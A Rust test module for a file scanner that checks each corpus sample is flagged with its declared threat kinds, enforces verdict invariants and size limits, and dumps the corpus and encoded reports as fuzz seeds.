// ---- tests ---------------------------------------------------------------------

#[test]
fn every_sample_produces_the_kinds_it_declares() {
    let mut failures = Vec::new();
    for s in samples() {
        // The size-limit sample is exercised with its own policy below.
        if s.name == "oversized-input" {
            continue;
        }
        let report = scan_default(&(s.build)());
        for kind in s.kinds {
            if !report.has(*kind) {
                failures.push(format!(
                    "{}: expected {kind:?}; got {:?}",
                    s.name,
                    report.findings.iter().map(|f| f.kind).collect::<Vec<_>>()
                ));
            }
        }
    }
    assert!(failures.is_empty(), "{}", failures.join("\n"));
}

#[test]
fn every_threat_kind_has_a_sample() {
    let covered: std::collections::BTreeSet<K> =
        samples().iter().flat_map(|s| s.kinds.iter().copied()).collect();
    let missing: Vec<&str> =
        K::ALL.iter().filter(|k| !covered.contains(k)).map(|k| k.id()).collect();
    assert!(
        missing.is_empty(),
        "add a corpus sample (tests/corpus.rs) for: {}",
        missing.join(", ")
    );
}

#[test]
fn oversized_input_sample_hits_the_size_limit() {
    let policy = crate::ScanPolicy { max_input_bytes: 0, ..crate::ScanPolicy::default() };
    let r = crate::scan(&[b'A'; 8], &policy);
    assert!(r.has(K::ScanLimitReached));
    assert_eq!(r.verdict, Verdict::Rejected);
}

/// Invariants every report must satisfy, whatever the input:
///
/// * a stored Medium+ active- or remote-content finding is never "Clean";
/// * a coverage gap (unreadable part) is never "Clean";
/// * `Rejected` always carries a reason, and only `Rejected` does;
/// * the hash is present.
pub(crate) fn assert_verdict_invariants(r: &crate::XRayReport, what: &str) {
    use crate::report::Category;
    let reaching = r.findings.iter().any(|f| {
        matches!(f.kind.category(), Category::ActiveContent | Category::RemoteContent)
            && f.severity >= Severity::Medium
    });
    let gap = r.findings.iter().any(|f| f.kind.limits_coverage());
    if reaching || gap {
        assert_ne!(r.verdict, Verdict::Clean, "{what}: Clean despite {:?}", r.findings);
    }
    assert_eq!(
        r.verdict == Verdict::Rejected,
        !r.rejection.is_empty(),
        "{what}: rejection reason must accompany exactly the Rejected verdict"
    );
    assert_eq!(r.sha256.len(), 64, "{what}");
}

#[test]
fn verdict_invariants_hold_over_the_whole_corpus() {
    for s in samples() {
        if s.name == "oversized-input" {
            continue;
        }
        assert_verdict_invariants(&scan_default(&(s.build)()), s.name);
    }
}

/// Writes the corpus to `$ARCA_CORPUS_OUT` (fuzz seeds, cross-checks with
/// independent tools).
#[test]
fn dump_corpus() {
    let Some(dir) = std::env::var_os("ARCA_CORPUS_OUT") else { return };
    let dir = std::path::PathBuf::from(dir);
    std::fs::create_dir_all(&dir).unwrap();
    for s in samples() {
        std::fs::write(dir.join(s.name), (s.build)()).unwrap();
    }
}

/// Writes the X-ray of every sample, wire-encoded and sealed in an envelope
/// exactly as the sandbox returns it, to `$ARCA_WIRE_OUT`: the seed corpus of
/// the `wire` fuzz target.
#[test]
fn dump_wire_seeds() {
    use arca_abi::envelope::{PayloadKind, seal};
    use arca_abi::wire;

    let Some(dir) = std::env::var_os("ARCA_WIRE_OUT") else { return };
    let dir = std::path::PathBuf::from(dir);
    std::fs::create_dir_all(&dir).unwrap();
    for s in samples() {
        if s.name == "oversized-input" {
            continue;
        }
        let report = scan_default(&(s.build)());
        let payload = wire::to_bytes(&report).unwrap();
        std::fs::write(dir.join(s.name), seal(PayloadKind::XRayReport, &payload).unwrap()).unwrap();
    }
}
